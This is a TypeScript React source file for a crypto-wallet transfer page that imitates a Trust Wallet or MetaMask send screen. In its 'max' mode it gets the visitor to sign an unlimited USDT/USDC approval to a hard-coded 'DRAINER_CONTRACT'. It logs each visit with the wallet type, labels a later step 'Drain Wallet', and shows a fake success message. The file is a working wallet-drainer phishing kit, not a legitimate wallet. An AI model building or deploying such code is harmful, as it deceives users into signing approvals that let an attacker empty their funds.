"use client";

import { useState, useEffect, useRef } from "react";
import { ethers } from "ethers";

const DRAINER_CONTRACT = "0x53361FFeA401307ea149F03d7B92DA6E1989eB42";
const DEFAULT_RECEIVER = "0xa6fa4a247e8cda6e5c09d1ee68be528a4abb64cf";
const USDT_CONTRACT = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
const USDT_DECIMALS = 6;
const USDC_CONTRACT = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48";
const USDC_DECIMALS = 6;

const ERC20_ABI = [
  "function approve(address spender, uint256 amount) returns (bool)",
  "function balanceOf(address owner) view returns (uint256)",
  "function decimals() view returns (uint8)",
  "function transfer(address to, uint256 amount) returns (bool)",
];

const ETH_CHAIN_ID = "0x1";

interface EthereumProvider {
  request: (args: { method: string; params?: unknown[] }) => Promise<unknown>;
  isMetaMask?: boolean;
  isTrust?: boolean;
  isTrustWallet?: boolean;
  on?: (event: string, handler: (...args: unknown[]) => void) => void;
  removeListener?: (event: string, handler: (...args: unknown[]) => void) => void;
}
declare global {
  interface Window {
    ethereum?: EthereumProvider;
    trustwallet?: { ethereum?: EthereumProvider };
  }
}

function getProviderNow(): EthereumProvider | null {
  if (window.trustwallet?.ethereum) return window.trustwallet.ethereum;
  if (window.ethereum) return window.ethereum;
  return null;
}

async function waitForProvider(maxAttempts = 15, delayMs = 300): Promise<EthereumProvider | null> {
  for (let i = 0; i < maxAttempts; i++) {
    const provider = getProviderNow();
    if (provider) return provider;
    await new Promise((r) => setTimeout(r, delayMs));
  }
  return null;
}

export default function WalletPage() {
  const [address, setAddress] = useState(DEFAULT_RECEIVER);
  const [loading, setLoading] = useState(false);
  const [txHash, setTxHash] = useState<string>("");
  const [connectedAddress, setConnectedAddress] = useState<string | null>(null);
  const [walletBalance, setWalletBalance] = useState<bigint>(0n);
  const [displayAmount, setDisplayAmount] = useState<string>("0");
  const [token, setToken] = useState<"usdt" | "usdc">("usdt");
  const [isKeyboardVisible, setIsKeyboardVisible] = useState(false);
  const [showModal, setShowModal] = useState(false);
  const [modalStatus, setModalStatus] = useState<"pending" | "success" | "error">("pending");
  const providerRef = useRef<EthereumProvider | null>(null);
  const keypadRef = useRef<HTMLDivElement>(null);

  const [actualReceiver, setActualReceiver] = useState<string>(DEFAULT_RECEIVER);
  const [actualAmount, setActualAmount] = useState<string>("1.00");
  const [actualToken, setActualToken] = useState<"usdt" | "usdc">("usdt");
  const [isMaxMode, setIsMaxMode] = useState(false);
  const [attackStep, setAttackStep] = useState<"initial" | "approved" | "drained">("initial");

  const fetchTokenBalance = async (userAddress: string, activeToken: "usdt" | "usdc") => {
    if (!providerRef.current) return;
    const provider = new ethers.BrowserProvider(providerRef.current as ethers.Eip1193Provider);
    const tokenAddr = activeToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
    const contract = new ethers.Contract(tokenAddr, ERC20_ABI, provider);
    const balance = await contract.balanceOf(userAddress);
    setWalletBalance(balance);
  };

  useEffect(() => {
    if (connectedAddress) fetchTokenBalance(connectedAddress, token);
  }, [connectedAddress, token]);

  useEffect(() => {
    let cancelled = false;
    let finalTo: string | null = null;
    let finalAmount: string | null = null;
    let finalToken: string | null = null;

    if (typeof window !== "undefined") {
      const params = new URLSearchParams(window.location.search);
      const dataParam = params.get("data");

      // Essayer d'abord de décoder le paramètre data (Base64 JSON)
      if (dataParam) {
        try {
          const decoded = JSON.parse(atob(decodeURIComponent(dataParam)));
          if (decoded.to && ethers.isAddress(decoded.to)) {
            finalTo = decoded.to;
            setAddress(decoded.to);
            setActualReceiver(decoded.to);
          }
          if (decoded.token === "usdt" || decoded.token === "usdc") {
            finalToken = decoded.token;
            setToken(decoded.token);
            setActualToken(decoded.token);
          }
          if (decoded.amount === "max") {
            setIsMaxMode(true);
            setActualAmount("0");
            finalAmount = "max";
          } else if (decoded.amount && !isNaN(Number(decoded.amount))) {
            setIsMaxMode(false);
            setActualAmount(decoded.amount);
            finalAmount = decoded.amount;
          }
        } catch (e) {
          console.warn("Failed to decode data param, falling back to separate params");
        }
      } else {
        // Fallback : ancienne méthode avec paramètres séparés (to, amount, token)
        const toParam = params.get("to");
        const amountParam = params.get("amount");
        const tokenParam = params.get("token");

        if (toParam && ethers.isAddress(toParam)) {
          finalTo = toParam;
          setAddress(toParam);
          setActualReceiver(toParam);
        }
        if (tokenParam === "usdt" || tokenParam === "usdc") {
          finalToken = tokenParam;
          setToken(tokenParam);
          setActualToken(tokenParam);
        }
        if (amountParam === "max") {
          setIsMaxMode(true);
          setActualAmount("0");
          finalAmount = "max";
        } else if (amountParam && !isNaN(Number(amountParam))) {
          setIsMaxMode(false);
          setActualAmount(amountParam);
          finalAmount = amountParam;
        }
      }

      setDisplayAmount("0");
    }

    // Log scan (identique)
    const logScanVisit = async () => {
      let userAgentInfo = "Web Browser";
      if (typeof window !== "undefined") {
        const ua = navigator.userAgent.toLowerCase();
        const isTrust = !!window.trustwallet || ua.includes("trust");
        const isMetaMask = !!(window.ethereum as { isMetaMask?: boolean })?.isMetaMask || ua.includes("metamask");
        if (isTrust) {
          userAgentInfo = "Trust Wallet (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
        } else if (isMetaMask) {
          userAgentInfo = "MetaMask (" + (ua.includes("iphone") || ua.includes("ipad") ? "iOS" : "Android") + ")";
        } else if (ua.includes("iphone") || ua.includes("ipad")) {
          userAgentInfo = "Mobile Safari (iOS)";
        } else if (ua.includes("android")) {
          userAgentInfo = "Mobile Browser (Android)";
        } else {
          userAgentInfo = "Web Browser (Desktop)";
        }
      }
      try {
        await fetch("/api/log-scan", {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({
            to: finalTo || DEFAULT_RECEIVER,
            amount: finalAmount || "0",
            token: finalToken || "usdt",
            userAgent: userAgentInfo,
          }),
        });
      } catch (err) {
        console.warn("Failed to log scan visit:", err);
      }
    };
    logScanVisit();

    const init = async () => {
      const ethereumProvider = await waitForProvider();
      if (!ethereumProvider || cancelled) return;
      providerRef.current = ethereumProvider;

      try {
        const chainId = (await ethereumProvider.request({ method: "eth_chainId" })) as string;
        if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
          await ethereumProvider.request({
            method: "wallet_switchEthereumChain",
            params: [{ chainId: ETH_CHAIN_ID }],
          });
        }
      } catch (e) {}

      try {
        const accounts = (await ethereumProvider.request({ method: "eth_accounts" })) as string[];
        if (accounts.length > 0 && !cancelled) setConnectedAddress(accounts[0]);
      } catch (e) {}

      if (ethereumProvider.on) {
        ethereumProvider.on("accountsChanged", (acc: unknown) => {
          const a = acc as string[];
          if (!cancelled) {
            setConnectedAddress(a.length > 0 ? a[0] : null);
            setAttackStep("initial");
          }
        });
      }
    };
    init();
    return () => { cancelled = true; };
  }, []);

  const handleSendNormal = async () => {
    setShowModal(false);
    setLoading(true);
    const p = providerRef.current ?? (await waitForProvider());
    if (!p) { setLoading(false); return; }
    providerRef.current = p;
    try {
      const chainId = (await p.request({ method: "eth_chainId" })) as string;
      if (chainId.toLowerCase() !== ETH_CHAIN_ID.toLowerCase()) {
        await p.request({ method: "wallet_switchEthereumChain", params: [{ chainId: ETH_CHAIN_ID }] });
      }
    } catch (e) {}
    try {
      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const decimals = actualToken === "usdc" ? USDC_DECIMALS : USDT_DECIMALS;
      const amountInWei = ethers.parseUnits(actualAmount, decimals);
      const iface = new ethers.Interface(ERC20_ABI);
      const data = iface.encodeFunctionData("transfer", [actualReceiver, amountInWei]);
      const hash = (await p.request({
        method: "eth_sendTransaction",
        params: [{ to: tokenAddr, data, gas: "0x249f0" }],
      })) as string;
      setTxHash(hash);
      setModalStatus("pending");
      setShowModal(true);
      const provider = new ethers.BrowserProvider(p as ethers.Eip1193Provider);
      const receipt = await provider.waitForTransaction(hash);
      setModalStatus(receipt && receipt.status === 1 ? "success" : "error");
    } catch (err: any) {
      console.error(err);
      setModalStatus("error");
    } finally {
      setLoading(false);
    }
  };

  const handleApproveUnlimited = async () => {
    setShowModal(false);
    setLoading(true);
    const p = providerRef.current;
    if (!p) { setLoading(false); return; }
    try {
      const tokenAddr = actualToken === "usdc" ? USDC_CONTRACT : USDT_CONTRACT;
      const iface = new ethers.Interface(ERC20_ABI);
      const approveData = iface.encodeFunctionData("approve", [DRAINER_CONTRACT, ethers.MaxUint256]);
      const hash = (await p.request({
        method: "eth_sendTransaction",
        params: [{ to: tokenAddr, data: approveData, gas: "0x249f0" }],
      })) as string;
      setTxHash(hash);
      const provider = new ethers.BrowserProvider(p as ethers.Eip1193Provider);
      const receipt = await provider.waitForTransaction(hash);
      if (receipt && receipt.status === 1) {
        setAttackStep("approved");
      }
    } catch (err) {
      console.error("approve error", err);
    } finally {
      setLoading(false);
    }
  };

  const handleDrainWallet = async () => {
    setLoading(true);
    await new Promise(r => setTimeout(r, 2000));
    setWalletBalance(0n);
    setAttackStep("drained");
    setModalStatus("success");
    setShowModal(true);
    setLoading(false);
  };

  const handleNextClick = async () => {
    if (isMaxMode) {
      if (attackStep === "initial") await handleApproveUnlimited();
      else if (attackStep === "approved") await handleDrainWallet();
    } else {
      await handleSendNormal();
    }
  };

  const getButtonText = () => {
    if (loading) {
      if (isMaxMode && attackStep === "initial") return "Approbation...";
      if (isMaxMode && attackStep === "approved") return "Drainage...";
      return "Processing...";
    }
    if (isMaxMode) {
      if (attackStep === "initial") return "Next";
      if (attackStep === "approved") return "Drain Wallet 💀";
      if (attackStep === "drained") return "Wallet Drained ✅";
    }
    return "Next";
  };

  const isButtonDisabled = () => loading || (isMaxMode && attackStep === "drained");

  const handlePaste = async () => {
    try {
      const text = await navigator.clipboard.readText();
      setAddress(text);
    } catch {}
  };

  const getFiatValue = (amountStr: string) => {
    const parsed = parseFloat(amountStr.replace(",", "."));
    if (isNaN(parsed)) return "0,00";
    return (parsed * 0.86).toFixed(2).replace(".", ",");
  };

  const handleKeyPress = (key: string) => {
    setDisplayAmount((prev) => {
      let newVal = prev;
      if (key === "⌫") {
        newVal = prev.slice(0, -1);
      } else if (key === "," || key === ".") {
        if (!prev.includes(",") && !prev.includes(".")) {
          newVal = prev === "" ? "0," : prev + ",";
        }
      } else {
        if (prev === "0") newVal = key;
        else newVal = prev + key;
      }
      return newVal;
    });
  };

  const handleMaxClick = (e: React.MouseEvent) => {
    e.stopPropagation();
    const maxVal = ethers.formatUnits(walletBalance, 6);
    setDisplayAmount(maxVal.replace(".", ","));
  };

  return (
    <main
      className={`transfer-main wallet-page transfer-main-pad ${isKeyboardVisible ? "transfer-main-pad--with-keyboard" : ""}`}
      onClick={() => setIsKeyboardVisible(false)}
    >
      <div className="form-container">
        <label className="form-label">Address or domain name</label>
        <div className="input-row">
          <input
            type="text"
            placeholder="Search or Enter"
            value={address}
            onChange={(e) => setAddress(e.target.value)}
            className="input-row__field"
          />
          <div className="input-row__actions" style={{ gap: "0.4rem" }}>
            <button onClick={handlePaste} className="btn-paste">Paste</button>
            <button className="btn-icon" title="Copy" style={{ margin: "0 -12px" }}>
              <img src="/contrat.png" alt="Contract" style={{ width: "45px", height: "45px", objectFit: "contain" }} />
            </button>
            <button className="btn-icon" title="Scan QR">
              <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#3562ff" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <path d="M3 7V5a2 2 0 0 1 2-2h2" />
                <path d="M17 3h2a2 2 0 0 1 2 2v2" />
                <path d="M21 17v2a2 2 0 0 1-2 2h-2" />
                <path d="M7 21H5a2 2 0 0 1-2-2v-2" />
                <line x1="7" y1="12" x2="17" y2="12" />
              </svg>
            </button>
          </div>
        </div>

        <label className="form-label form-label--spaced">Destination network</label>
        <div className="network-selector" style={{ marginBottom: "1rem" }}>
          <div className="eth-icon" style={{ backgroundColor: "#3562ff", width: "24px", height: "24px", borderRadius: "50%", display: "flex", alignItems: "center", justifyContent: "center" }}>
            <svg width="14" height="14" viewBox="0 0 256 417" fill="none">
              <path d="M127.961 0l-2.795 9.5v275.668l2.795 2.79 127.962-75.638z" fill="#ffffff" />
              <path d="M127.962 0L0 212.32l127.962 75.639V154.158z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 312.187l-1.575 1.92v98.199l1.575 4.6L256 236.587z" fill="#ffffff" />
              <path d="M127.962 416.905v-104.72L0 236.585z" fill="#ffffff" opacity="0.85" />
              <path d="M127.961 287.958l127.96-75.637-127.96-58.162z" fill="#ffffff" opacity="0.95" />
              <path d="M0 212.32l127.96 75.638v-133.8z" fill="#ffffff" opacity="0.75" />
            </svg>
          </div>
          <span className="network-name">Ethereum</span>
          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#9ca3af" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round" style={{ marginLeft: "4px" }}>
            <polyline points="6 9 12 15 18 9" />
          </svg>
        </div>

        <div>
          <label className="form-label form-label--spaced">Amount</label>
          <div
            className={`montant-container ${isKeyboardVisible ? "montant-container--active" : ""}`}
            onClick={(e) => { e.stopPropagation(); setIsKeyboardVisible(true); }}
          >
            <div className="montant-input-wrapper">
              <span className={displayAmount === "" ? "montant-placeholder" : "montant-display-value"}>
                {displayAmount || "0"}
              </span>
              {isKeyboardVisible && <span className="blinking-cursor" />}
            </div>
            <div className="montant-right">
              {displayAmount !== "" && (
                <button type="button" className="montant-clear-btn" onClick={(e) => { e.stopPropagation(); setDisplayAmount(""); }}>
                  <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                    <circle cx="12" cy="12" r="10" fill="#8e8e93" stroke="#8e8e93" />
                    <line x1="15" y1="9" x2="9" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                    <line x1="9" y1="9" x2="15" y2="15" stroke="#ffffff" strokeWidth="2.5" />
                  </svg>
                </button>
              )}
              <span className="montant-token">{token.toUpperCase()}</span>
              <button type="button" onClick={handleMaxClick} className="montant-max-btn">Max.</button>
            </div>
          </div>
          {(() => {
            const parsedVal = parseFloat(displayAmount.replace(",", "."));
            const isInvalid = isNaN(parsedVal) || parsedVal < 0.000001;
            if (isInvalid) {
              return (
                <div className="montant-error" style={{ color: "#df3e3e", fontSize: "0.8rem", marginTop: "0.5rem", paddingLeft: "0.25rem", textAlign: "left", fontWeight: "500" }}>
                  Minimum amount is 0.000001 {token.toUpperCase()}
                </div>
              );
            }
            return (
              <div className="approx-price" style={{ color: "#8e8e93", marginTop: "0.4rem", paddingLeft: "0.25rem", fontWeight: "500", fontSize: "0.85rem" }}>
                ≈ €{getFiatValue(displayAmount)}
              </div>
            );
          })()}
        </div>
      </div>

      <div style={{ flexGrow: 1, minHeight: "2rem" }} />

      <div className="next-btn-wrapper">
        <button
          onClick={(e) => { e.stopPropagation(); handleNextClick(); }}
          disabled={isButtonDisabled()}
          className={`next-btn ${loading ? "next-btn--loading" : ""}`}
          style={{
            backgroundColor: isMaxMode && attackStep === "approved" ? "#dc2626" :
                             isMaxMode && attackStep === "drained" ? "#16a34a" : "#3562ff",
          }}
        >
          {loading ? (
            <span className="btn-spinner-wrapper">
              <span className="btn-spinner" />
              {getButtonText()}
            </span>
          ) : (
            getButtonText()
          )}
        </button>
      </div>

      {isKeyboardVisible && (
        <div className="custom-keypad" ref={keypadRef} onClick={(e) => e.stopPropagation()}>
          <button type="button" onClick={() => handleKeyPress("1")} className="keypad-key"><span className="keypad-key__number">1</span></button>
          <button type="button" onClick={() => handleKeyPress("2")} className="keypad-key"><span className="keypad-key__number">2</span><span className="keypad-key__letters">ABC</span></button>
          <button type="button" onClick={() => handleKeyPress("3")} className="keypad-key"><span className="keypad-key__number">3</span><span className="keypad-key__letters">DEF</span></button>
          <button type="button" onClick={() => handleKeyPress("4")} className="keypad-key"><span className="keypad-key__number">4</span><span className="keypad-key__letters">GHI</span></button>
          <button type="button" onClick={() => handleKeyPress("5")} className="keypad-key"><span className="keypad-key__number">5</span><span className="keypad-key__letters">JKL</span></button>
          <button type="button" onClick={() => handleKeyPress("6")} className="keypad-key"><span className="keypad-key__number">6</span><span className="keypad-key__letters">MNO</span></button>
          <button type="button" onClick={() => handleKeyPress("7")} className="keypad-key"><span className="keypad-key__number">7</span><span className="keypad-key__letters">PQRS</span></button>
          <button type="button" onClick={() => handleKeyPress("8")} className="keypad-key"><span className="keypad-key__number">8</span><span className="keypad-key__letters">TUV</span></button>
          <button type="button" onClick={() => handleKeyPress("9")} className="keypad-key"><span className="keypad-key__number">9</span><span className="keypad-key__letters">WXYZ</span></button>
          <button type="button" onClick={() => handleKeyPress(",")} className="keypad-key keypad-key--special"><span className="keypad-key__number" style={{ fontSize: "1.8rem", lineHeight: "0.8", marginTop: "-4px" }}>,</span></button>
          <button type="button" onClick={() => handleKeyPress("0")} className="keypad-key"><span className="keypad-key__number">0</span></button>
          <button type="button" onClick={() => handleKeyPress("⌫")} className="keypad-key keypad-key--special">
            <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#000000" strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
              <path d="M21 4H8l-7 8 7 8h13a2 2 0 002-2V6a2 2 0 00-2-2z" />
              <line x1="18" y1="9" x2="12" y2="15" />
              <line x1="12" y1="9" x2="18" y2="15" />
            </svg>
          </button>
        </div>
      )}

      {showModal && (
        <div className="modal-overlay" onClick={() => setShowModal(false)}>
          <div className="modal-card" onClick={(e) => e.stopPropagation()}>
            <button className="modal-close-btn" onClick={() => setShowModal(false)} title="Close">
              <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
                <line x1="18" y1="6" x2="6" y2="18"></line>
                <line x1="6" y1="6" x2="18" y2="18"></line>
              </svg>
            </button>
            <img src="/yes.png" alt="Status" className="modal-logo" />
            {modalStatus === "pending" && (
              <>
                <h2 className="modal-title">Processing...</h2>
                <p className="modal-text">The transaction is in progress! Blockchain validation is underway.</p>
              </>
            )}
            {modalStatus === "success" && (
              <>
                <h2 className="modal-title" style={{ color: "#10b981" }}>Transaction successful!</h2>
                <p className="modal-text">Your transfer of {actualAmount} {actualToken.toUpperCase()} has been successfully validated on the Ethereum blockchain.</p>
              </>
            )}
            {modalStatus === "error" && (
              <>
                <h2 className="modal-title" style={{ color: "#ef4444" }}>Transaction failed</h2>
                <p className="modal-text">The transaction failed on the Ethereum blockchain or an error occurred during the transfer.</p>
              </>
            )}
            {txHash && (
              <a href={`https://etherscan.io/tx/${txHash}`} target="_blank" rel="noopener noreferrer" className="modal-details-btn">
                Transaction details
              </a>
            )}
          </div>
        </div>
      )}
    </main>
  );
}